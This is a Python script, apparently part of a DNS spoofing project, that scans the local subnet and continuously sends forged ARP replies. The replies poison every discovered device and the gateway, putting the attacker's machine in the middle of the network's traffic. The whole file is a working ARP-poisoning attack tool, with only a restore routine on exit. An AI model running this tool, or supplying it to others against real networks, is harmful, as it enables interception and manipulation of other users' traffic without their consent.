from scapy.all import ARP, Ether, sendp, send, srp
import time
import sys
import socket

from DNSspoof import get_mac


class Spoofer:
    def __init__(self):
        self.devices = []

    def get_mac(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = srp(broadcast / arp_request, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc if answered_list else None

    def scan_network(self, ip_range):
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = srp(broadcast / arp_request, timeout=1, verbose=False)[0]  # 調整 timeout

        for element in answered_list:
            self.devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
            print(f"Device found: IP={element[1].psrc}, MAC={element[1].hwsrc}")

    def spoof_all(self, local_ip, gateway_ip):
        local_mac = self.get_mac(local_ip)
        gateway_mac = self.get_mac(gateway_ip)
        if not local_mac:
            print("[-] Could not get the local MAC address.")
            return

        for device in self.devices:
            # 跳過本機 IP，防止本機被欺騙
            if device['ip'] == local_ip or device['ip'] == gateway_ip:
                continue

            target_mac = device['mac']
            if not target_mac:
                print(f"[-] Could not resolve MAC for {device['ip']}. Skipping.")
                continue

            # 發送 ARP 回應包欺騙目標設備
            packet = Ether(dst=target_mac) / ARP(
                op=2,
                pdst=device['ip'],
                hwdst=target_mac,
                psrc=gateway_ip
            )
            sendp(packet, verbose=False)

            # 發送反向 ARP 回應包欺騙網關
            reverse_packet = Ether(dst=gateway_mac) / ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=device['ip']
            )
            sendp(reverse_packet, verbose=False)  # 如果需要欺騙網關則取消註解

    def restore_network(self, local_ip, gateway_ip):
        local_mac = self.get_mac(local_ip)
        gateway_mac = self.get_mac(gateway_ip)
        if not local_mac or not gateway_mac:
            print("[-] Could not get MAC addresses for local or gateway. Exiting restore.")
            return

        # 還原網絡中所有設備的 ARP 表
        for device in self.devices:
            send(ARP(op=2, pdst=device['ip'], hwdst=device['mac'], psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=device['ip'], hwsrc=device['mac']), count=4, verbose=False)
        print("[+] Network restored to normal state.")

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def get_ip_range(local_ip):
    # 將 local_ip 分割成前三段，並組合成範圍，例如 192.168.1.0/24
    ip_parts = local_ip.split('.')[:3]  # 取前三段
    ip_range = '.'.join(ip_parts) + '.0/24'
    return ip_range

def get_gateway_ip(local_ip):
    # 將 local_ip 分割成前三段，並組合成範圍，例如 192.168.1.0/24
    ip_parts = local_ip.split('.')[:3]  # 取前三段
    ip_range = '.'.join(ip_parts) + '.1'
    return ip_range


if __name__ == '__main__':
    local_ip = get_local_ip()
    ip_range = get_ip_range(local_ip)  # 定義 IP 範圍

    gateway_ip = get_gateway_ip(local_ip)
    print(f"[+] Detected local IP: {local_ip}")

    spoofer = Spoofer()
    spoofer.scan_network(ip_range)

    if not spoofer.devices:
        print("[-] No devices found in the network.")
        sys.exit(0)

    while True:
        try:
            spoofer.scan_network(ip_range)
            spoofer.spoof_all(local_ip, gateway_ip)
            print("[+] Packets sent")
            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[-] Detected CTRL + C ... Restoring ARP tables...")
            spoofer.restore_network(local_ip, gateway_ip)
            print("[+] ARP tables restored.")
            sys.exit(0)

        except Exception as e:
            print(f"[-] Unexpected error: {e}")
            continue  # 繼續迴圈，即使發生其他異常